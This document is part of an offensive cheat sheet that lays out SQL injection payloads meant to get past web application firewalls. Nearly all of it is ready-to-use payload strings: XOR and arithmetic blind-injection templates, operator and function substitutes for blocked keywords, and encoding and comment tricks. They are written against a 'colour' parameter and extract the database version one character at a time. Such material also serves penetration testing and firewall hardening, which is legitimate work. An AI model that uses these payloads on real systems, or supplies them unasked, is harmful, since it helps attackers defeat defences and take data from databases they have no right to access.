# PART 2: WAF Bypass SQLi Payloads (Complete Taxonomy)

### 2.1 Operator Classes That WAFs Typically MISS

WAFs block keywords (`UNION`, `SELECT`, `SLEEP`, `OR`, `AND`). They rarely block **operators** because operators are normal parts of expressions.

#### A. XOR Operator (`^`) -- THE BYPASS THAT WORKED

MySQL/MariaDB XOR is a bitwise operator. When applied to strings, MySQL casts them to integers (0 for non-numeric strings).

```
# Boolean blind via XOR
# TRUE condition: colour value XOR (version result - same value) = colour value (no change)
# FALSE condition: colour value XOR (different value) = different value

# Pattern: 'VALUE'^EXPRESSION^'
colour=Black'^@@version-11^'

# How it works:
# 'Black' = 0 (string cast to int)
# @@version = '10.9.8-MariaDB' = 10 (cast to int, truncated at first non-numeric)
# 0 ^ (10-11) ^ 0 = 0 ^ (-1) ^ 0 = ... (different from 0^0^0)
# The differential in query results reveals the boolean condition

# Version extraction character by character:
colour=Black'^(ORD(MID(@@version,1,1))>52)^'
colour=Black'^(ORD(MID(@@version,1,1))>53)^'
# When value changes from TRUE to FALSE, you've found the character

# General XOR blind template:
PARAM=VALUE'^(CONDITION)^'
PARAM=VALUE'^(SELECT+EXPRESSION)^'
```

**Why WAFs miss XOR**:
- `^` is a normal caret character used in text, regex, math
- No SQL keyword present in the payload
- Pattern `'^...^'` looks like innocent string concatenation to regex engines
- WAF rules focus on `AND`, `OR`, `UNION`, `SELECT`, not bitwise operators

#### B. Arithmetic Subtraction Blind

```
# Subtract from a known value -- if result changes, condition was true
colour=Black'-IF(1=1,1,0)-'
colour=Black'-IF(1=2,1,0)-'

# Without IF keyword (also blocked):
colour=Black'-(CASE WHEN(1=1)THEN 1 ELSE 0 END)-'
colour=Black'-(1=1)-'     # boolean to int: TRUE=1, FALSE=0

# Subtract version info:
colour=Black'-(ORD(MID(@@version,1,1))-48)-'
```

#### C. Multiplication / Division

```
colour=Black'*(1=1)*'
colour=Black'*(1=2)*'
colour=Black'*@@version*'
colour=Black'/(1=1)/'
colour=Black'DIV(1=1)DIV'
```

#### D. Bitwise AND (`&`), OR (`|`), NOT (`~`), Shift (`<<`, `>>`)

```
colour=Black'&(ORD(MID(@@version,1,1))>52)&'
colour=Black'|(ORD(MID(@@version,1,1))>52)|'
colour=Black'|(1)LIKE(1)|'

# Bitwise shift
colour=Black'<<(1=1)<<'
colour=Black'>>(1=1)>>'
```

#### E. Comparison Operators

```
# BETWEEN (rarely blocked)
' AND ORD(MID(@@version,1,1)) BETWEEN 48 AND 57--
' AND @@version BETWEEN 'a' AND 'z'--

# GREATEST / LEAST
' AND GREATEST(1,2)=2--
' AND LEAST(1,2)=1--

# LIKE / RLIKE / REGEXP
' AND @@version LIKE '10%'--
' AND @@version RLIKE '10\\.9'--
' AND @@version REGEXP '^10'--

# IN operator
' AND ORD(MID(@@version,1,1)) IN (49,50,51,52,53)--

# STRCMP
' AND STRCMP(MID(@@version,1,1),'1')=0--

# <> (not equal) -- build binary search
' AND ORD(MID(@@version,1,1))<>48--
' AND ORD(MID(@@version,1,1))<>49--
```

#### F. Conditional Expression Alternatives (When IF is blocked)

```
# CASE WHEN (most reliable)
' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--

# ELT (MySQL specific)
' AND ELT(1=1,1)--

# FIELD
' AND FIELD(1,1)=1--

# COALESCE + NULL tricks
' AND COALESCE(NULL,(SELECT 1))=1--

# NULLIF
' AND NULLIF(1,2) IS NOT NULL--

# IFNULL
' AND IFNULL(NULL,1)=1--
```

### 2.2 Function Alternatives When Common Ones Are Blocked

| Blocked | Alternative 1 | Alternative 2 | Alternative 3 |
|---------|--------------|--------------|--------------|
| `SUBSTR()` | `MID()` | `LEFT()+RIGHT()` | `LPAD()` / `RPAD()` |
| `SUBSTRING()` | `MID()` | `REVERSE(RIGHT(REVERSE(x),N))` | `TRIM(LEADING... FROM...)` |
| `ASCII()` | `ORD()` | `CONV(HEX(c),16,10)` | `CRC32()` (for hashing) |
| `CHAR()` | `CHR()` (Postgres) | `0x41` (hex literal) | `UNHEX('41')` |
| `CONCAT()` | `CONCAT_WS('',a,b)` | Using `||` (not MySQL default) | `GROUP_CONCAT()` |
| `LENGTH()` | `CHAR_LENGTH()` | `OCTET_LENGTH()` | `BIT_LENGTH()/8` |
| `SLEEP()` | `BENCHMARK(5000000,SHA1('x'))` | Heavy query (cartesian join) | `GET_LOCK('x',5)` |
| `IF()` | `CASE WHEN...THEN...END` | `ELT()` | `IFNULL(NULLIF(),)` |
| `VERSION()` | `@@version` | `@@version_compile_os` | `@@version_comment` |
| `DATABASE()` | `SCHEMA()` | `@@database` (doesn't exist, use schema()) | -- |
| `USER()` | `CURRENT_USER()` | `SESSION_USER()` | `SYSTEM_USER()` |
| `INFORMATION_SCHEMA` | `mysql.innodb_table_stats` (5.6+) | `sys.schema_tables_with_full_table_scans` | -- |
| `HEX()` | `CONV(val,10,16)` | `EXPORT_SET()` | -- |

### 2.3 String Extraction Without SUBSTR/MID

```sql
-- Using TRIM to extract characters
TRIM(LEADING 'a' FROM TRIM(LEADING 'b' FROM value))

-- Using REVERSE + RIGHT
REVERSE(RIGHT(REVERSE(@@version), 1))  -- first char

-- Using INSERT to overwrite and compare
INSERT(@@version, 2, 9999, '')  -- first char only

-- Using EXPORT_SET for bit extraction
EXPORT_SET(ORD(MID(@@version,1,1)), '1', '0', '', 8)  -- binary representation

-- Using MAKE_SET
MAKE_SET(1, MID(@@version,1,1))

-- Using LPAD/RPAD
LPAD(@@version, 1, '')  -- first char
```

### 2.4 Encoding Bypasses

```
# Double URL encoding
colour=Black%2527^(1)^%2527

# Unicode fullwidth quote
colour=Black＇^(1)^＇

# Hex-encoded strings (avoid quotes entirely)
AND @@version LIKE 0x3130252525   -- '10%'

# MySQL-specific version comments
/*!50000AND*/ /*!50000(1=1)*/

# Newline injection (breaks regex line matching)
colour=Black%0a'^(1)^'%0a

# Tab insertion
colour=Black%09'^(1)^'

# NULL byte prefix
colour=%00Black'^(1)^'
```

### 2.5 Comment-Based Bypasses by DB Engine

| DB | Inline Comment | Block Comment | Version Comment |
|----|---------------|---------------|-----------------|
| MySQL/MariaDB | `#`, `-- ` (space required) | `/* */` | `/*!50000 code */` |
| PostgreSQL | `--` | `/* */` | N/A |
| MSSQL | `--` | `/* */` | N/A |
| Oracle | `--` | `/* */` | N/A |
| SQLite | `--` | `/* */` | N/A |

MySQL version comments are the most powerful WAF bypass because `/*!50000UNION*/` is syntactically a comment to the WAF but executed by MySQL.

### 2.6 MySQL/MariaDB Specific Operator Tricks

```sql
-- Backtick quoting (MySQL only)
SELECT `version`()            -- same as version()

-- Double-quoted identifiers (ANSI SQL mode)
SELECT "version"()

-- @ variables for extraction
SET @a:=(SELECT @@version); SELECT @a;

-- := inline assignment (in SELECT)
SELECT @a:=@@version

-- JSON operators (MySQL 5.7+ / MariaDB 10.2+)
AND JSON_EXTRACT('{"a":1}', '$.a')=1

-- Spatial functions for TRUE condition
AND ST_Equals(ST_GeomFromText('POINT(1 1)'),ST_GeomFromText('POINT(1 1)'))

-- Collation tricks
AND @@version COLLATE utf8_general_ci LIKE '10%'

-- Math functions for boolean extraction
AND COS(0)=1   -- always TRUE
AND COS(0)=2   -- always FALSE
AND PI()>3     -- always TRUE
AND PI()<3     -- always FALSE
```

---

